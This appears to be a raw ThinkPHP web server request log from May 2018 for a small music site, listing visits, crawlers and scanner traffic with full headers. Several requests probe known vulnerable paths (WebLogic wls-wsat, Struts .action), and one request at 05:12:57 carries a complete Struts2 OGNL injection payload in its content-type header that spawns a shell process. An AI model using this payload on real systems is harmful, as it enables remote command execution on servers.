[ 2018-05-05T00:54:50+08:00 ] 172.16.0.5 119.147.207.152 GET /login.action
[ log ] www.zard-forever.com/login.action [运行时间：0.014665s][吞吐率：68.19req/s] [内存消耗：1,356.75kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'login.action',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => 'www.zard-forever.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T01:16:35+08:00 ] 172.16.0.5 112.90.82.218 GET /news/html
[ log ] www.zard-forever.com/news/html [运行时间：0.015830s][吞吐率：63.17req/s] [内存消耗：1,356.80kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'news',
    1 => 'html',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => 'www.zard-forever.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T01:19:26+08:00 ] 172.16.0.5 101.204.253.19 POST /wls-wsat/CoordinatorPortType
[ log ] 123.207.34.110:80/wls-wsat/CoordinatorPortType [运行时间：0.012126s][吞吐率：82.47req/s] [内存消耗：1,356.66kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'wls-wsat',
    1 => 'CoordinatorPortType',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '1214',
  'content-type' => 'text/xml',
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0',
  'host' => '123.207.34.110:80',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T01:43:25+08:00 ] 172.16.0.5 47.93.90.175 GET /
[ log ] 111.231.70.36:8000/ [运行时间：0.014412s][吞吐率：69.39req/s] [内存消耗：1,677.87kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'connection' => 'Close',
  'host' => '111.231.70.36:8000',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T02:02:52+08:00 ] 172.16.0.5 23.253.141.187 POST /wls-wsat/CoordinatorPortType
[ log ] 123.207.34.110:80/wls-wsat/CoordinatorPortType [运行时间：0.012039s][吞吐率：83.06req/s] [内存消耗：1,356.66kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'wls-wsat',
    1 => 'CoordinatorPortType',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '1195',
  'content-type' => 'text/xml',
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0',
  'host' => '123.207.34.110:80',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T02:02:54+08:00 ] 172.16.0.5 23.253.141.187 GET /index.php
[ log ] 123.207.34.110/index.php [运行时间：0.013986s][吞吐率：71.50req/s] [内存消耗：1,678.09kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'host' => '123.207.34.110',
  'user-agent' => 'Mozilla/5.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T02:43:04+08:00 ] 172.16.0.5 101.226.68.215 GET /
[ log ] www.zard-forever.com/ [运行时间：0.014888s][吞吐率：67.17req/s] [内存消耗：1,679.10kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => 'www.zard-forever.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T03:19:19+08:00 ] 172.16.0.5 123.151.42.61 GET /
[ log ] www.baidu.com/ [运行时间：0.014475s][吞吐率：69.08req/s] [内存消耗：1,678.36kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'proxy-connection' => 'Keep-Alive',
  'content-type' => 'text/html',
  'accept' => '*/*',
  'host' => 'www.baidu.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T04:37:46+08:00 ] 172.16.0.5 14.17.21.58 GET /wls-wsat/CoordinatorPortType
[ log ] 123.207.34.110/wls-wsat/CoordinatorPortType [运行时间：0.011856s][吞吐率：84.35req/s] [内存消耗：1,356.93kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'wls-wsat',
    1 => 'CoordinatorPortType',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T04:52:19+08:00 ] 172.16.0.5 119.147.207.152 GET /index.php
[ log ] 123.207.34.110/index.php [运行时间：0.014989s][吞吐率：66.72req/s] [内存消耗：1,679.09kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T05:12:57+08:00 ] 172.16.0.5 101.254.149.128 GET /
[ log ] 123.207.34.110/ [运行时间：0.014350s][吞吐率：69.69req/s] [内存消耗：1,678.28kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'host' => '123.207.34.110',
  'accept' => '*/*',
  'user-agent' => 'User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T05:12:57+08:00 ] 172.16.0.5 101.254.149.128 GET /index.action
[ log ] 123.207.34.110/index.action [运行时间：0.015310s][吞吐率：65.32req/s] [内存消耗：1,360.37kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index.action',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '123.207.34.110',
  'content-type' => '%{(#nike=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'whoami\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'echo windows--2017\'}:{\'/bin/bash\',\'-c\',\'echo linux--2017\'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T08:39:32+08:00 ] 172.16.0.5 91.210.145.16 GET /
[ log ] 00it.cn/ [运行时间：0.015361s][吞吐率：65.10req/s] [内存消耗：1,679.89kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'image/gif, image/x-xbitmap, image/jpeg,image/pjpeg, application/x-shockwave-flash,application/vnd.ms-excel,application/vnd.ms-powerpoint,application/msword',
  'accept-language' => 'ru',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36',
  'referer' => 'http://00it.cn',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'keep-alive',
  'host' => '00it.cn',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T08:39:36+08:00 ] 172.16.0.5 91.210.145.16 GET /
[ log ] blog.00it.cn/ [运行时间：0.016121s][吞吐率：62.03req/s] [内存消耗：1,679.92kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'image/gif, image/x-xbitmap, image/jpeg,image/pjpeg, application/x-shockwave-flash,application/vnd.ms-excel,application/vnd.ms-powerpoint,application/msword',
  'accept-language' => 'ru',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36',
  'referer' => 'http://blog.00it.cn',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'keep-alive',
  'host' => 'blog.00it.cn',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T08:39:40+08:00 ] 172.16.0.5 91.210.145.16 GET /
[ log ] test.00it.cn/ [运行时间：0.016125s][吞吐率：62.02req/s] [内存消耗：1,679.92kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'image/gif, image/x-xbitmap, image/jpeg,image/pjpeg, application/x-shockwave-flash,application/vnd.ms-excel,application/vnd.ms-powerpoint,application/msword',
  'accept-language' => 'ru',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36',
  'referer' => 'http://test.00it.cn',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'keep-alive',
  'host' => 'test.00it.cn',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T08:39:43+08:00 ] 172.16.0.5 91.210.145.16 GET /
[ log ] wp.00it.cn/ [运行时间：0.015814s][吞吐率：63.24req/s] [内存消耗：1,679.92kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'image/gif, image/x-xbitmap, image/jpeg,image/pjpeg, application/x-shockwave-flash,application/vnd.ms-excel,application/vnd.ms-powerpoint,application/msword',
  'accept-language' => 'ru',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36',
  'referer' => 'http://wp.00it.cn',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'keep-alive',
  'host' => 'wp.00it.cn',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T08:39:47+08:00 ] 172.16.0.5 91.210.145.16 GET /blog/
[ log ] 00it.cn/blog/ [运行时间：0.012144s][吞吐率：82.35req/s] [内存消耗：1,358.79kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'blog',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'image/gif, image/x-xbitmap, image/jpeg,image/pjpeg, application/x-shockwave-flash,application/vnd.ms-excel,application/vnd.ms-powerpoint,application/msword',
  'accept-language' => 'ru',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36',
  'referer' => 'http://00it.cn/blog/',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'keep-alive',
  'host' => '00it.cn',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T09:38:24+08:00 ] 172.16.0.5 116.62.176.205 GET /
[ log ] 115.159.191.150:8000/ [运行时间：0.014512s][吞吐率：68.91req/s] [内存消耗：1,677.90kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'connection' => 'Close',
  'host' => '115.159.191.150:8000',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T10:19:27+08:00 ] 172.16.0.5 101.200.72.63 GET /webservice/proxy/validate
[ log ] 101.200.72.63/webservice/proxy/validate [运行时间：0.013849s][吞吐率：72.21req/s] [内存消耗：1,355.22kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'webservice',
    1 => 'proxy',
    2 => 'validate',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '101.200.72.63',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T11:09:20+08:00 ] 172.16.0.5 207.46.13.211 GET /
[ log ] zard-forever.com/ [运行时间：0.014790s][吞吐率：67.61req/s] [内存消耗：1,680.79kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'host' => 'zard-forever.com',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'connection' => 'Keep-Alive',
  'cache-control' => 'no-cache',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T11:24:11+08:00 ] 172.16.0.5 58.250.137.193 GET /
[ log ] zard-forever.com/ [运行时间：0.015501s][吞吐率：64.51req/s] [内存消耗：1,681.31kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9b4) Gecko/2008030317 Firefox/3.0b4',
  'q-ua' => 'KQB22_GA/220020&KMTT_3/200020&JV2&151920&SunMicrosystemswtk&0&4309&V3',
  'host' => 'zard-forever.com',
  'content-length' => '0',
  'connection' => 'close',
  'accept-encoding' => 'gzip,deflate',
  'accept-charset' => 'gb2312,iso8859-1,utf-8',
  'accept' => 'text/vnd.wap.wml,text/html,application/vnd.wap.xhtml+xml,application/xhtml+xml',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T11:24:12+08:00 ] 172.16.0.5 183.3.227.100 GET /
[ log ] zard-forever.com/ [运行时间：0.028681s][吞吐率：34.87req/s] [内存消耗：1,681.76kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for-pound' => '117.136.41.55',
  'x-forwarded-for' => '117.136.41.55',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0; zh-cn; M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.3 Mobile Safari/537.36',
  'host' => 'zard-forever.com',
  'cookie' => 'PHPSESSID=qvn6qtbgpih10n30av6dehjh2p',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.8',
  'accept-encoding' => 'gzip',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/sharpp,image/apng,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T11:24:12+08:00 ] 172.16.0.5 113.96.218.51 GET /
[ log ] zard-forever.com/ [运行时间：0.030782s][吞吐率：32.49req/s] [内存消耗：1,681.31kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9b4) Gecko/2008030317 Firefox/3.0b4',
  'q-ua' => 'KQB22_GA/220020&KMTT_3/200020&JV2&151920&SunMicrosystemswtk&0&4309&V3',
  'host' => 'zard-forever.com',
  'content-length' => '0',
  'connection' => 'close',
  'accept-encoding' => 'gzip,deflate',
  'accept-charset' => 'gb2312,iso8859-1,utf-8',
  'accept' => 'text/vnd.wap.wml,text/html,application/vnd.wap.xhtml+xml,application/xhtml+xml',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T11:24:21+08:00 ] 172.16.0.5 121.51.14.25 GET /index/music/index.html
[ log ] zard-forever.com/index/music/index.html [运行时间：0.023728s][吞吐率：42.14req/s] [内存消耗：2,731.17kb] [文件加载：58]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'music',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for-pound' => '117.136.41.55',
  'x-forwarded-for' => '117.136.41.55',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0; zh-cn; M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.3 Mobile Safari/537.36',
  'referer' => 'http://zard-forever.com/',
  'host' => 'zard-forever.com',
  'cookie' => 'PHPSESSID=qvn6qtbgpih10n30av6dehjh2p',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.8',
  'accept-encoding' => 'gzip',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/sharpp,image/apng,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Music->index[ /home/www/WWW/application/index/controller/Music.php ]
[ info ] [ DB ] INIT mysql
